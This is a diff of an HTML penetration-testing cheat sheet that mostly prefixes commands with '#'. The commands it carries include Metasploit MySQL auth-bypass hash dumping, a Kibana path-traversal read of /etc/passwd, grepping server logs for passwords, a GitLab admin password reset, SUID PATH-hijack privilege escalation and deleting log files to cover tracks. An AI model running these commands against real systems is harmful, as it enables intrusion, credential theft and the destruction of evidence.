@@ -340,8 +340,8 @@ dc=DOMAIN,dc=DOMAIN<br />
 </details>
     <details >
 <summary > &nbsp; &nbsp;  ➜  Enumeration [Metasploit] : </summary>
-  <p class="command" >  msf> use auxiliary/scanner/mysql/mysql_version  <br />
-msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump  <br />
+  <p class="command" >#  msf> use auxiliary/scanner/mysql/mysql_version  <br />
+# msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump  <br />
 </p>
 </details>
    </details>  
@@ -354,12 +354,12 @@ msf> use uxiliary/scanner/mysql/mysql_authbypass_hashdump  <br />
 </details>
   <details >
 <summary > &nbsp; &nbsp;  ➜ ELK search strings </summary>
-  <p class="command" > curl -X GET "X.X.X.X:9200/_search?q=password" </p>
+  <p class="command" ># curl -X GET "X.X.X.X:9200/_search?q=password" </p>
 </details> 
   <details >
 <summary > &nbsp; &nbsp;  ➜ Kibana LFI < 6.4.3 & 5.6.13 </summary>
-  <p class="command" > /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../etc/passwd </p>
-  <p class="command" > <a href=" https://github.com/mpgn/CVE-2018-17246 " target="_blank" class="lien2"/> 🔗 LFI exploit Kibana - Github </a> </p>
+  <p class="command" > 'URL'/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../etc/passwd </p>
+  <p class="command2" > <a href=" https://github.com/mpgn/CVE-2018-17246 " target="_blank" class="lien2"/> 🔗 LFI exploit Kibana - Github </a> </p>
 </details> 
 </details>
          
@@ -471,17 +471,17 @@ OK <br />
 <summary >Check Logs : </summary>
 <details >
 <summary > &nbsp; &nbsp;  ➜  Check Apache2 Logs : </summary>
-  <p class="command"> cd /var/log/apache2 | ls </p>
-  <p class="command"> grep -r password_reset | grep -r login | grep -r pass </p>
+  <p class="command"># cd /var/log/apache2 | ls </p>
+  <p class="command"># grep -r password_reset | grep -r login | grep -r pass </p>
 </details>
 <details >
 <summary > &nbsp; &nbsp;  ➜  Check login Logs : </summary>
-<p class="command"> tail -f /var/log/auth.log </p>
+<p class="command"># tail -f /var/log/auth.log </p>
 </details>
  <details >
 <summary > &nbsp; &nbsp;  ➜  Check Ngnix Logs : </summary>
-<p class="command">cd /var/log/nginx/ | ls | cat * </p>
-<p class="command"> grep -r password_reset | grep -r login | grep -r pass </p>
+<p class="command">#cd /var/log/nginx/ | ls | cat * </p>
+<p class="command"># grep -r password_reset | grep -r login | grep -r pass </p>
 </details> 
 </details>
 
@@ -542,7 +542,8 @@ OK <br />
 <summary >Rails Console-Ruby : </summary>
 <details >
 <summary > &nbsp; &nbsp;  ➜ Change User password :  </summary>
-  <p class="command">  </br>
+  <p class="command">
+  # gitlab-rails console </br>
     u = User.find_by_id(1) </br>
 u.password = "a_stupid_pa$$word"</br>
 u.password_confirmation = "a_stupid_pa$$word"</br>
@@ -557,10 +558,10 @@ u.save </p>
 <details >
 <summary > &nbsp; &nbsp;  ➜ SUID File Call chmod variable  </summary>
 <p class="command">
-cd /tmp/  </br>
-echo "/bin/bash" > chmod </br>
-chmod +x chmod </br>
-export PATH=/tmp:$PATH</br>
+#cd /tmp/  </br>
+#echo "/bin/bash" > chmod </br>
+#chmod +x chmod </br>
+#export PATH=/tmp:$PATH</br>
 And execute Suid file </p>
   <p > <a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/" target="_blank" class="lien2"/> 🔗 Path Exploitation</a> </p>
 </details>
@@ -572,9 +573,9 @@ And execute Suid file </p>
 <summary >Log Files : </summary>
 <details >
 <summary > &nbsp; &nbsp;  ➜  Clean files logs : </summary>
-    <p class="command"> cp /var/log/.... /var/log/....1 </p>
+    <p class="command"># cp /var/log/.... /var/log/....1 </p>
   <p>                Action !!  </p>
-     <p class="command" > rm /var/log/... | mv /var/log/....1 /var/log/.... </p>
+     <p class="command" ># rm /var/log/... | mv /var/log/....1 /var/log/.... </p>
 </details>
           <details >
 <summary > &nbsp; &nbsp;  ➜  Truncate : </summary>
